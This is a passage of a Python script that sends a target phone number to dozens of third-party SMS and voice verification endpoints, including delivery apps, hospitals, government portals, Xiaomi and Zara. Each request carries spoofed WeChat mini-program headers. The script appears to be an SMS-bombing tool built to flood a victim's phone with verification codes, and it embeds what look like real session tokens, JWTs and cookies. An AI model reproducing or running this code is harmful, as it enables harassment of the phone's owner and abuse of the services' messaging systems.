    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "token": "[object Null]",
    "Content-Type": "application/json; charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxd244e1bddbd29494/10/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
}
    
    url27 = "https://smart.shuye.com/api/sms/send"
    
    response27 = requests.post(url27, json=data27, headers=headers27)
    print("第25个接口运行完毕")

def request_url28():
    url28 = 'https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/'
    headers28 = {
    'Host': 'delivery-api.imdada.cn',
    'Enable-Gps': '0',
    'App-Name': 'i-dada',
    'Unique-Id': '344EF073-E5E4-42FC-A354-36148D490572',
    'Location-Time': '1714966492526',
    'Platform': 'iOS',
    'Accept': '*/*',
    'Locate-Error-Code': '-1',
    'Accept-Encoding': 'gzip;q=1.0, compress;q=0.5',
    'Request-Id': '18929FFB-5AE9-42E1-8646-3D1C29CD43EF',
    'Locate-Altitude': '0',
    'User-Agent': 'DadaStaff/11.59.1 (com.dada.staff; build:210332; iOS 16.6.1) Alamofire/11.59.1',
    'Locate-Extra': '{"Locate-Provider-Str":"unknown","Locate-Time-App":"","Locate-Device-Id":"344EF073-E5E4-42FC-A354-36148D490572","Locate-Work-Mode":"0","Locate-Time-Sdk":"0","Locate-Time":"1714966492526","Locate-Platform":"iOS","Locate-AdCode":"0","Locate-ForeGround":1,"Locate-Error-Flag":false}',
    'Operator': 'unknow',
    'UUID': '344EF073-E5E4-42FC-A354-36148D490572',
    'Work-Mode': '0',
    'Network': 'wifi',
    'Ad-Code': '0',
    'User-Token': 'user_token',
    'Locate-Speed': '0',
    'Verification-Hash': 'bc83fdc4d52ca1e0b0fd4ad00e0fc381',
    'Locate-Type': '2',
    'OS-Version': '16.6.1',
    'City-Code': '0',
    'Model': 'iPhone12,1',
    'Accept-Language': 'zh-Hans-CN;q=1.0',
    'Lng': '0',
    'User-Id': '0',
    'Locate-Direction': '0',
    'Rate-Limit-Hash': '81326c6aa3590526572434ef4ef40864',
    'Model-Type': 'iPhone12,1',
    'Client-Time': '1714966492526',
    'Lat': '0',
    'Locate-From': '1',
    'Connection': 'keep-alive',
    'Channel-ID': 'A01',
    'City-Id': '0',
    'App-Version': '11.59.1',
    'Sdcard-Id': '344EF073-E5E4-42FC-A354-36148D490572',
    'Location-Provider': '0',
    'Accuracy': '',
    'Locate-Provider': '0'
}

    params28 = {
    'phone': phone,
    'type': '2'
}
    response28 = requests.get(url28, headers=headers28, params=params28)

def request_url29():
    data29 = {"mobile": phone}
    headers29 = {
    "Host": "weixin-nj.pcmh.com.cn",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx43f08083ad884950/20/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url29 = "https://weixin-nj.pcmh.com.cn/sms-gateway/aliyun/identity-verification?organization-id=11510901345812856P"
    response29 = requests.post(url29, json=data29, headers=headers29)
    print("第27个接口运行完毕")

def request_url30():
    data30 = {"phone": phone}
    headers30 = {
    "Host": "www.hylyljk.com",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "xweb_xhr": "1",
    "userType": "2",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx155e63b80773f98c/7/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url30 = "https://www.hylyljk.com/ymm-common/sms/sendSmsCode"
    response30 = requests.post(url30, 
json=data30, headers=headers30)
    print("第28个接口运行完毕")

def request_url31():
    data31 = {"phone": phone, "MethodWay": 1, "Product": 1}
    headers31 = {
    "Host": "api.zyydjk.net",
    "Connection": "keep-alive",
    "Content-Length": "49",
    "deviceId": "1234567890-1234567890-1234567890",
    "source": "yyMiniApp",
    "product": "yyMiniApp",
    "authorization": "bearer oHY_55PTtR6BhnMQXQFTuI0EMk3A",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "xweb_xhr": "1",
    "openId": "1234567890-1234567890-1234567890",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxbe9f76c35c45111c/44/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url31 = "https://api.zyydjk.net/message/public/sendSms"
    response31 = requests.post(url31, json=data31, headers=headers31)
    print("第29个接口运行完毕")

def request_url32():
    data32 = {"tel": phone}
    headers32 = {
    "Host": "m.ylzhaopin.com",
    "Connection": "keep-alive",
    "Content-Length": "15",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ5cHdwcm9ncmFtIiwibmFtZSI6Im85THlSNjhmM3A3R2MtLWoybjBIT2hlbjlQVDgiLCJpYXQiOjE3MTExOTA3NzIsImV4cCI6MTcxMTE5Nzk3Mn0.nS8C4L6ZVGDjjxA_VmzyTgoGG7gcMafXrgL9X0KpSRo",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxb6c159d78b2a6399/4/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url32 = "https://m.ylzhaopin.com/Wxapi/Account/getverify"
    response32 = requests.post(url32, data=data32, headers=headers32)
    print("第30个接口运行完毕")

def request_url33():
    data33 = {"from": "dynamic_login", "mobile": phone}
    headers33 = {
    "Host": "mapi.jialongjk.com",
    "Connection": "keep-alive",
    "Content-Length": "47",
    "device-version": "10",
    "device-platform": "pc",
    "sub-from": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "webview": "",
    "Content-Type": "application/json",
    "xweb_xhr": "1",
    "uid": "",
    "sub-from-v1": "",
    "uuid": "086b92f4509178b3321197b1bbe1642b",
    "platform": "wx_mnapp",
    "token": "",
    "app-version": "1.1.31",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxdbea4bfc433b0017/65/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url33 = "https://mapi.jialongjk.com/api/user/verify/mobile/code"
    response33 = requests.post(url33, json=data33, headers=headers33)
    print("第31个接口运行完毕")

def request_url100():
    url100 = 'https://product.yl1001.com/api-yp/register/sendSmsCode'
    headers100 = {
    'Host': 'product.yl1001.com',
    'Connection': 'keep-alive',
    'Content-Length': '24',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'id': '0',
    'X-Tingyun': 'c=B|685-c1OYjko',
    'Content-Type': 'application/json; charset=UTF-8',
    'Accept': 'application/json, text/plain, */*',
    'SecretKey': '94cbe78f3bcec8be81d68e7bdfb9ad9b',
    'xweb_xhr': '1',
    'uid': '0',
    'platform': '1',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wxcbfa127f857c2790/308/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}
    data100 = {"mobile": phone}

    response100 = requests.post(url100, headers=headers100, json=data100)
    print("第32个接口运行完毕")

def request_url34():
    url34 = 'https://superdesk.avic-s.com/super_cloud/api/wechat/front/smsCode'
    headers34 = {
    'Host': 'superdesk.avic-s.com',
    'Connection': 'keep-alive',
    'Content-Length': '34',
    'Accept': 'application/json, text/plain, */*',
    'xweb_xhr': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx0efbe4601aed7dfe/49/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data34 = {'mobile': phone, 'orgId': -1, 'type': 0}

    response34 = requests.post(url34, headers=headers34, data=data34)
    print("第33个接口运行完毕")

def request_url35():
    url35 = 'https://wx-prm.bshcn.com.cn/*.jsonRequest'
    headers35 = {
    'Host': 'wx-prm.bshcn.com.cn',
    'Connection': 'keep-alive',
    'Content-Length': '46',
    'B-Product-Code': 'hcn.sh-pdxqrmyy.patient_mini',
    'B-Version': '1.2.2.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/json',
    'T-Product-Code': 'hcn.sh-pdxqrmyy.patient_mini',
    'X-Service-Method': 'registerSmsCodeNew',
    'xweb_xhr': '1',
    'X-Access-Token': '',
    'X-Service-Id': 'cas.wxregisterService',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wxca096f515338c55b/159/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data35 = [
    "hcn.sh-pdxqrmyy.patient_mini",
    phone
]

    response35 = requests.post(url35, headers=headers35, json=data35)
    print("第34个接口运行完毕")

def request_url36():
    url36 = 'https://user.zjzwfw.gov.cn/nuc/reg/sendSmsCode'
    headers36 = {
    'Host': 'user.zjzwfw.gov.cn',
    'Connection': 'keep-alive',
    'Content-Length': '23',
    'guc-accountType': 'person',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/json;charset=UTF-8',
    'ak': 'ak',
    'guc-platform': 'weixin',
    'xweb_xhr': '1',
    'guc-endpoint': 'C',
    'X-Site-Code': '339900',
    'X-Device-Id': '37a4be4390593c68963e5ab24bc7e209',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx289ade03af020941/39/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data36 = {"phone": phone}

    response36 = requests.post(url36, headers=headers36, json=data36)
    print("第35个接口运行完毕")

def request_url37():
    url37 = 'https://96885wx.hrss.jl.gov.cn/minifast/frontRestService/frontBcpDataRestService/getBcpData'
    headers37 = {
    'Host': '96885wx.hrss.jl.gov.cn',
    'Connection': 'keep-alive',
    'Content-Length': '95',
    'xweb_xhr': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx93486ef87cedbd44/139/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data37 = {
    "methodName": "JRZX_093",
    "loginNo": phone,
    "loginType": "10",
    "yae100": "12",
    "siteToken": ""
}

    response37 = requests.post(url37, headers=headers37, json=data37)
    print("第36个接口运行完毕")

def request_url38():
    url38 = 'https://m.52xiaoyuan.cn/mapp/getMappSmsCode'
    headers38 = {
    'Host': 'm.52xiaoyuan.cn',
    'Connection': 'keep-alive',
    'Content-Length': '45',
    'dhash': 'eda4e699e178c69039367ce5f7b871dd',
    'ts': '1711226083884510;ede6895b37b5d7f5e18f74cc6334c855',
    'xweb_xhr': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'token': 'bafcee32-6075-4a58-bbe4-a17bc253939a',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx56c43729cf6a360a/25/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data38 = {
    "mobile": phone,
    "module": "xykt_gctc"
}

    response38 = requests.post(url38, headers=headers38, json=data38)
    print("第37个接口运行完毕")

def request_url39():
    url39 = 'https://sqsz.shiyan.gov.cn/smartCommunity/appsend/sendCode?time=1711225888672&sign=516256e7e7ae11f7ac9a51eb6c4e0da4'
    headers39 = {
    'Host': 'sqsz.shiyan.gov.cn',
    'Connection': 'keep-alive',
    'Content-Length': '95',
    'clientinfo': '{"devid":""}',
    'xweb_xhr': '1',
    'headdata': '%7B%22data_value%22%3A%2217343387439%22%2C%22flag%22%3A0%2C%22send_type%22%3A1%2C%22communityId%22%3A6%2C%22roleId%22%3A2%2C%22user_id%22%3A246756%7D',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx75e106ac21a7eea8/46/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data39 = {
    "data_value": phone,
    "flag": 0,
    "send_type": 1,
    "communityId": 6,
    "roleId": 2,
    "user_id": 246756
}

    response39 = requests.post(url39, headers=headers39, json=data39)
    print("第38个接口运行完毕")

def request_url40():
    url40 = 'https://ehr-recruitment.yifengx.com/restful/login/sendMessage'
    headers40 = {
    'Host': 'ehr-recruitment.yifengx.com',
    'Connection': 'keep-alive',
    'Content-Length': '23',
    'xweb_xhr': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx1768e077cefc65b1/79/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data40 = {
    "phone": phone
}

    response40 = requests.post(url40, headers=headers40, json=data40)
    print("第39个接口运行完毕")

def request_url41():
    url41 = 'https://yf.yifengyunche.com/admin/yfycapp/get_sms/secret/f68a6f6e071090621458faeed3cbc781'
    headers41 = {
    'Host': 'yf.yifengyunche.com',
    'Connection': 'keep-alive',
    'Content-Length': '70',
    'xweb_xhr': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx21fd3633e52da572/66/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data41 = {
    "phone": phone,
    "sms_type": "xcx_login",
    "uuid": "oguyl5B1fCGz-AgAXyi1DEhCykPE"
}

    response41 = requests.post(url41, headers=headers41, data=data41)
    print("第40个接口运行完毕")

def request_url42():
    url42 = 'https://account.xiaomi.com/pass/sns/wxapp/v2/sendTicket'
    headers42 = {
    'Host': 'account.xiaomi.com',
    'Connection': 'keep-alive',
    'Content-Length': '34',
    'xweb_xhr': '1',
    'cookie': 'wxSToken=p+qwiucQZ0j+B76YG0aqz4//m7yT7J6112faWuPTzmhW4wCDtLfGVVYgmru1gP80G+DWjqJOeiJ+abPOim657IxKwTHbe5x3SN5hgpOKR9soC2Kz442TXXKTFFDGnGjU21K1T36ZUayxzPYBGPtlgX5Nq8zIGowlQu9SbrIexoVXE9UfRVbora6qZC7rIARj;',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://servicewechat.com/wx183d85f5e5e273c6/15/page-frame.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9'
}

    data42 = {
    "phone": phone,
    "sid": "micar_wxlite"
}

    response42 = requests.post(url42, headers=headers42, data=data42)
    print("第41个接口运行完毕")

def request_url43():
    url43 = "https://api.kq36.com/public/returnhtm/return_uni-app.asp?cmd=login_user_phone"
    headers43 = {
    "Host": "api.kq36.com",
    "Connection": "keep-alive",
    "Content-Length": "63",
    "ua": '{"v":3,"n":"mp-weixin"}',
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx01c584b2a7cd0c15/264/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}


    data43 = f"mobile={phone}&typen=login&uid=oZqPrs4_EwbdKo5yZsiQhzPr29iA"

    response43 = requests.post(url43, headers=headers43, data=data43)
    print("第42个接口运行完毕")

def request_url44():
    url44 = "https://newretail2.xianfengsg.com/newretail/api/sms/sendSms"
    headers44 = {
    "Host": "newretail2.xianfengsg.com",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "self-store-id": "1648354775180",
    "wxa-appid": "wxb34bc4be8e276ed8",
    "os-version": "wxapp-3.9.6",
    "access-token": "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjM2QSIsInN1YiI6IntcInVzZXJJZFwiOjE3NzI5NTE0MzE1MTM0Mjc5NjksXCJ1c2VyVHlwZVwiOlwiV1hBX1VTRVJcIixcIndvcmtpbmdPcmdJZFwiOjEwMTExLFwid3hhT3BlbmlkXCI6XCJvM1QwYzVQeVFOeHl2VXNwMC0ta3JEVFlkc0VjXCJ9IiwiaWF0IjoxNzExNTM5NTM1LCJleHAiOjE3MTE2MjU5MzV9.Y37exds3aIdi_vq2FbsBmKvpv-sg-NCTSLM886-lgSg",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "delivery-store-id": "1648354775180",
    "Content-Type": "application/json",
    "xweb_xhr": "1",
    "api-version": "0.0.5",
    "app-version": "wxapp-3.1.45",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxb34bc4be8e276ed8/719/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}


    data44 = f'{{"mobile":"{phone}"}}'

    response44 = requests.post(url44, headers=headers44, data=data44)
    print("第43个接口运行完毕")

def request_url45():
    url45 = "https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7"
    headers45 = {
    "Host": "www.zara.cn",
    "Connection": "keep-alive",
    "Content-Length": "64",
    "WCTrustedToken": "100240366335%2CwMeokmx34GF0tDE4ONTr9PHYTnUMx3eC31M9idfwvIA%3D",
    "ITX-APPID": "ZaraWechat wxd95a72c5f595b6a3",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "WCToken": "100240366335%2CtBMwYGFsn%2BlVqrxv2qna1XpghCNKlMz1lChtTq7W4RFw6%2BU7WHIDBTLhLDo9OMPzb6rpW0EDJ9dU3ZugwHrUzp82IkXOjzA1lTGNVBkX7DR2q7lYVjXaQA1u6NHX%2BKhrhp%2FxCi6GIF651l4L5VkL1CRekO6WfZ2aJUOvi0rA57ZiFyurTvAi%2Bh4TL3UQTdLCLQIbJ46bLsmbQFzpB5qnVvjuPGbV1q6wLjBnLdkSkUgmO1czuQumbu%2BM%2BAQ2i4VR",
    "Content-Type": "application/json",
    "xweb_xhr": "1",
    "userId": "100240366335",
    "Cookie": "ITXSESSIONID=430432c696c6131368ccd9620151d413; ITXDEVICEID=a9284b4ce3afc90a016fa711c48288a1; IDROSTA=0b77996b5a86:32a914adaff7c6c9fb2b8233d; _abck=1B3AE95117673B9C8CB1ACC89C340C70~-1~YAAQFAWK3qB6eTaOAQAA+DokfwuEW2bTVIIFrymGc6tbIFh8WRyufdH0e0Peo2qrO7VagICwx8wMHFTAG+8bkJy+krieYYFBNcw1hpenGxFnXV6Y/q5utsBzLVy3JuYr7JN0vWdKyFSow69/GYN9i+QGBV7Hvmyf+0+rgIlGsCTWJCReZpziznutoQN33xORc6CaYA3UZc/4xixP6OBTcfR6tsU5C0no8BdbPEo8If1MVgE3sgguJjfSCAWm9yc5sVl5QvZTplp6zF9Cu54QTYYlR0Zs2ywwjEK/ZSScDixvK9U2gmBVGF2snddrsxi9olr0uVMy+yYoZupZha/7ySeRVKfz/kXO6UlDnBNFDciZzmw2gg;JSESSIONID=0000Me_t-Egf2Zj4W3DqjLBVw7-:3aa4aakdv; ITXSESSIONID=430432c696c6131368ccd9620151d413;__mgjuuid=736d90cf-59d4-4016-a462-9323b90d6a1e; bm_sz=3EF6893EDCB93926B93E43151002DC11~YAAQDgWK3uj02zWOAQAAoFgjfxeSyS12EW/VkWXPf0kh8k7ADct2iIktIYfj6AYdZzYLN7+JPb1gHG15nk7txm/A+m8nYOgChvTi0wlHwe78sb/GdcnXOnyIUG2OjaUboiMB0gIfpbvUsqiP3nYTm4dYO3sC+tE5TAlluXsx7QRtNv/QzMUYZc35qXQ2pfoeVS+fNDdEcwzmrJzCBgk5vkhULnR2EAt1oWWDvEZtN9gidAFrUqA+pAzM3lUNCgrhIChz3e+TdKJ6lt5x+pXwPH+FTWDdZd0V6Fwmi1LVs6q+ckzeZGfXcQNsIAPmOwe9DCXPEh+ooH9CwXNxk58JH8u03WaQYffQIyyGH7QodhTl74",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxd95a72c5f595b6a3/334/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    data45 = f'{{"phone":{{"countryCode":"+86","subscriberNumber":"{phone}"}}}}'

    response45 = requests.post(url45, headers=headers45, data=data45)
    print("第44个接口运行完毕")

def request_url46():
    url46 = "https://xiaoshou.lujiandairy.com/api/wx/send/mobile/bind_mobile"
    headers46 = {
    "Host": "xiaoshou.lujiandairy.com",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "xweb_xhr": "1",
    "role": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "token": "",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx881f659964749509/15/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}


    data46 = {"mobile": phone}

    response46 = requests.post(url46, headers=headers46, json=data46)
    print("第45个接口运行完毕")

def request_url47():
    url47 = "https://api.kucee.com/website.Access/getPhoneCode"
    headers47 = {
    "Host": "api.kucee.com",
    "Connection": "keep-alive",
    "Content-Length": "136",
    "W-Token": "4276",
    "xweb_xhr": "1",
    "U-Token": "",
    "AppId-Token": "wx942a1bf556cf82ed",
    "Uni-Code": "633f39b271e585b3ed3af77237320e21",
